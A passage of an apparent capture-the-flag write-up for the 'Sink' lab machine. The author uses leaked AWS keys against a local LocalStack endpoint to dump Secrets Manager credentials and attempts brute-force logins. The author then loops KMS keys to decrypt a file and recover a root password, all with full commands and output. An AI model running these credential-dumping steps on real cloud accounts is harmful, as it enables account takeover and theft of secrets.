<span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nc">AwsException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have AWS key and secret. So let’s configure aws client using marcus user.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811061823.png" alt="[Pasted image 20210811061823.png]" /></p>

<h1 id="aws-secrets-manager">AWS Secrets Manager</h1>

<p>AWS Secrets Manager is a great service to enhance your security posture by allowing you to <strong>remove any hard-coded secrets within your application and replacing them with a simple API call</strong> to the aid of your secrets manager which then services the request with the relevant secret. As a result, AWS Secrets Manager acts as a <strong>single source of truth for all your secrets across all of your applications</strong>.</p>

<p>AWS Secrets Manager enables the <strong>ease of rotating secrets</strong> and therefore enhancing the security of that secret. An example of this could be your database credentials. Other secret types can also have automatic rotation enabled through the use of lambda functions, for example, API keys.</p>

<p>Access to your secrets within AWS Secret Manager is governed by fine-grained IAM identity-based policies in addition to resource-based policies.</p>

<p>To allow a user form a different account to access your secret you need to authorize him to access the secret and also authorize him to decrypt the secret in KMS. The Key policy also needs to allows the external user to use it.</p>

<p><strong>AWS Secrets Manager integrates with AWS KMS to encrypt your secrets within AWS Secrets Manager.</strong></p>

<div lang="json" class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre><span class="err">marcus@sink:~$</span><span class="w"> </span><span class="err">aws</span><span class="w"> </span><span class="err">secretsmanager</span><span class="w"> </span><span class="err">list-secrets</span><span class="w"> </span><span class="err">--endpoint-url=http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">4566</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"SecretList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-ZBdpT"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jenkins Login"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Master Server to manage release cycle 1"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KmsKeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationLambdaARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationRules"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AutomaticallyAfterDays"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
            </span><span class="nl">"SecretVersionsToStages"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"28dcf9a0-77f9-4c79-bf06-179d44f79aba"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                    </span><span class="s2">"AWSCURRENT"</span><span class="w">
                </span><span class="p">]</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-yuzCR"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Sink Panel"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A panel to manage the resources in the devnode"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KmsKeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationLambdaARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationRules"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AutomaticallyAfterDays"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
            </span><span class="nl">"SecretVersionsToStages"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"7992c80a-cddb-48ff-9dad-32a158c05087"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                    </span><span class="s2">"AWSCURRENT"</span><span class="w">
                </span><span class="p">]</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-BdPAO"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jira Support"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Manage customer issues"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KmsKeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationLambdaARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"RotationRules"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AutomaticallyAfterDays"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
            </span><span class="nl">"SecretVersionsToStages"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"59881642-c591-4d5b-8773-5f76297dfc7a"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                    </span><span class="s2">"AWSCURRENT"</span><span class="w">
                </span><span class="p">]</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">marcus@sink:~$</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811183750.png" alt="[Pasted image 20210811183750.png]" /></p>

<div lang="json" class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="err">marcus@sink:~$</span><span class="w"> </span><span class="err">aws</span><span class="w"> </span><span class="err">secretsmanager</span><span class="w"> </span><span class="err">get-secret-value</span><span class="w"> </span><span class="err">--secret-id</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-ZBdpT"</span><span class="w"> </span><span class="err">--endpoint-url=http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">4566</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-ZBdpT"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jenkins Login"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"28dcf9a0-77f9-4c79-bf06-179d44f79aba"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"SecretString"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">john@sink.htb</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">R);</span><span class="se">\\</span><span class="s2">)ShS99mZ~8j</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionStages"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"AWSCURRENT"</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"CreatedDate"</span><span class="p">:</span><span class="w"> </span><span class="mi">1628654129</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">marcus@sink:~$</span><span class="w"> </span><span class="err">aws</span><span class="w"> </span><span class="err">secretsmanager</span><span class="w"> </span><span class="err">get-secret-value</span><span class="w"> </span><span class="err">--secret-id</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-yuzCR"</span><span class="w"> </span><span class="err">--endpoint-url=http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">4566</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-yuzCR"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Sink Panel"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"7992c80a-cddb-48ff-9dad-32a158c05087"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"SecretString"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">albert@sink.htb</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Welcome123!</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionStages"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"AWSCURRENT"</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"CreatedDate"</span><span class="p">:</span><span class="w"> </span><span class="mi">1628654129</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">marcus@sink:~$</span><span class="w"> </span><span class="err">aws</span><span class="w"> </span><span class="err">secretsmanager</span><span class="w"> </span><span class="err">get-secret-value</span><span class="w"> </span><span class="err">--secret-id</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-BdPAO"</span><span class="w"> </span><span class="err">--endpoint-url=http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">4566</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"ARN"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-BdPAO"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jira Support"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"59881642-c591-4d5b-8773-5f76297dfc7a"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"SecretString"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">david@sink.htb</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">EALB=bcC=`a7f2#k</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"VersionStages"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"AWSCURRENT"</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"CreatedDate"</span><span class="p">:</span><span class="w"> </span><span class="mi">1628654129</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></pre></td></tr></tbody></table></code></div></div>

<p>Dumping the keys from aws secretsmanager using the secret id from secretsmanager list-keys.</p>

<p>In the dump keys, I obtained more passwords and users. So I tried to login with the credentials.</p>

<p><code class="language-plaintext highlighter-rouge">john@sink.htb ::  R);\)ShS99mZ~8j</code>
<code class="language-plaintext highlighter-rouge">albert@sink.htb ::  Welcome123!</code>
<code class="language-plaintext highlighter-rouge">david@sink.htb :: EALB=bcC=`a7f2#k</code></p>

<p>I tried to bruteforce with the usernames and passwords. As fail2ban was implemented on the box I was denied service for a while.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811184643.png" alt="[Pasted image 20210811184643.png]" /></p>

<p>So i tried with the only user password combination, as user <code class="language-plaintext highlighter-rouge">david</code> also exist on the machine.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>david@sink.htb :: <span class="nv">EALB</span><span class="o">=</span><span class="nv">bcC</span><span class="o">=</span><span class="sb">`</span>a7f2#k
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811185737.png" alt="[Pasted image 20210811185737.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811190023.png" alt="[Pasted image 20210811190023.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811191509.png" alt="[Pasted image 20210811191509.png]" /></p>

<h1 id="root--escalation">Root  Escalation</h1>

<p>An encrypted file is seen in a file. Not sure how to decrypted we need keys to decrypt.</p>

<p>Let’s reconfigure aws client.  AWS has key management service, where we can store keys, let’s see if we can find some keys in aws kms.</p>

<div lang="json" class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="err">david@sink:~$</span><span class="w"> </span><span class="err">aws</span><span class="w"> </span><span class="err">--endpoint-url=http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">4566</span><span class="w"> </span><span class="err">kms</span><span class="w"> </span><span class="err">list-keys</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nl">"Keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0b539917-5eff-45b2-9fa1-e13f0d2c42ac"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"16754494-4333-4f77-ad4c-d0b73d799939"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2378914f-ea22-47af-8b0c-8252ef09cd5f"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"53bb45ef-bf96-47b2-a423-74d9b89a297a"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"804125db-bdf1-465a-a058-07fc87c0fad0"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"837a2f6e-e64c-45bc-a7aa-efa56a550401"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"881df7e3-fb6f-4c7b-9195-7f210e79e525"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"KeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"f2358fef-e813-4c59-87c8-70e50f6d4f70"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"KeyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>We have many keys.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811193947.png" alt="[Pasted image 20210811193947.png]" /></p>

<blockquote>
  <p>AWS KMS Decrypt reference
 https://awscli.amazonaws.com/v2/documentation/api/latest/reference/kms/decrypt.html</p>
</blockquote>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>david@sink:~<span class="nv">$ </span>aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://127.0.0.1:4566 kms list-keys | <span class="nb">grep </span>Id | <span class="nb">awk</span> <span class="s1">'{ print $2 }'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'",'</span>
0b539917-5eff-45b2-9fa1-e13f0d2c42ac
16754494-4333-4f77-ad4c-d0b73d799939
2378914f-ea22-47af-8b0c-8252ef09cd5f
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
53bb45ef-bf96-47b2-a423-74d9b89a297a
804125db-bdf1-465a-a058-07fc87c0fad0
837a2f6e-e64c-45bc-a7aa-efa56a550401
881df7e3-fb6f-4c7b-9195-7f210e79e525
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
f2358fef-e813-4c59-87c8-70e50f6d4f70
david@sink:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Get keyId to suppy to decrypted the encrypted message.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">for </span>key <span class="k">in</span> <span class="sb">`</span><span class="nb">cat </span>keys<span class="sb">`</span>
<span class="k">do
</span>aws kms decrypt <span class="nt">--endpoint-url</span><span class="o">=</span>http://127.0.0.1:4566 <span class="nt">--ciphertext-blob</span> <span class="se">\</span>
fileb:///home/david/Projects/Prod_Deployment/servers.enc <span class="nt">--key-id</span> <span class="nv">$key</span> <span class="nt">--output</span> <span class="se">\</span>
text <span class="nt">--query</span> Plaintext <span class="nt">--encryption-algorithm</span> <span class="s2">"RSAES_OAEP_SHA_256"</span>
<span class="k">done</span>

</pre></td></tr></tbody></table></code></div></div>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>david@sink:~<span class="nv">$ </span>sh run.sh 

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 0b539917-5eff-45b2-9fa1-e13f0d2c42ac is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 16754494-4333-4f77-ad4c-d0b73d799939 is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 2378914f-ea22-47af-8b0c-8252ef09cd5f is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 2bf9c582-eed7-482f-bfb6-2e4e7eb88b78 is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 53bb45ef-bf96-47b2-a423-74d9b89a297a is disabled.
H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA<span class="o">=</span>

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 837a2f6e-e64c-45bc-a7aa-efa56a550401 is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: 881df7e3-fb6f-4c7b-9195-7f210e79e525 is disabled.

An error occurred <span class="o">(</span>InternalFailureException<span class="o">)</span> when calling the Decrypt operation <span class="o">(</span>reached max retries: 4<span class="o">)</span>: key <span class="nb">type </span>not yet supported <span class="k">for </span>decryption

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: f0579746-10c3-4fd1-b2ab-f312a5a0f3fc is disabled.

An error occurred <span class="o">(</span>DisabledException<span class="o">)</span> when calling the Decrypt operation: f2358fef-e813-4c59-87c8-70e50f6d4f70 is disabled.

</pre></td></tr></tbody></table></code></div></div>

<div lang="text" class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=
</pre></td></tr></tbody></table></code></div></div>

<p>Base64 encrypted  key ?</p>

<p>Lets go to cyberchef and find out different keys</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811200540.png" alt="[Pasted image 20210811200540.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811200559.png" alt="[Pasted image 20210811200559.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811200617.png" alt="[Pasted image 20210811200617.png]" /></p>

<div lang="yaml" class="language-yaml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="na">server</span><span class="pi">:</span>
  <span class="na">listenaddr</span><span class="pi">:</span> <span class="s2">"</span><span class="s">"</span>
  <span class="na">port</span><span class="pi">:</span> <span class="m">80</span>
  <span class="na">hosts</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="s">certs.sink.htb</span>
    <span class="pi">-</span> <span class="s">vault.sink.htb</span>
<span class="na">defaultuser</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">admin</span>
  <span class="na">pass</span><span class="pi">:</span> <span class="s">_uezduQ!EY5AHfe2</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have admin user and a password. Login with ROOT.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811200736.png" alt="[Pasted image 20210811200736.png]" /></p>

